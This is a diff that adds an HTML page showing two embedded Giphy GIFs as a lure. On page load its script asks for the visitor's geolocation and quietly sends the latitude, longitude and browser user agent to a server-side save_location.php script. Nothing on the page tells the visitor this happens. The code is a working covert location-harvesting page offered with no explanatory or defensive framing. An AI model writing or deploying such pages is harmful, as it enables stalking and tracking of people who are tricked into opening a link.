@@ -1,0 +1,40 @@
+
+
+<!DOCTYPE html>
+
+<html>
+
+<body onload="getLocation()">
+   <p align="center">  
+     <iframe 
+     src="https://giphy.com/embed/wlKlLBf2vtXNK" width="392" height="480" style="width:50%;" frameBorder="0" class="giphy-embed" allowFullScreen>
+     </iframe>
+     
+     <iframe src="https://giphy.com/embed/TjAcxImn74uoDYVxFl" width="480" height="480" style="width:50%;" frameBorder="0" class="giphy-embed" allowFullScreen>
+    </iframe>
+   </p>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+
+   const xhttp = new XMLHttpRequest();
+   xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&user_agent= " + navigator.userAgent);
+   xhttp.send();
+
+}
+</script>
+
+</body>
+</html>
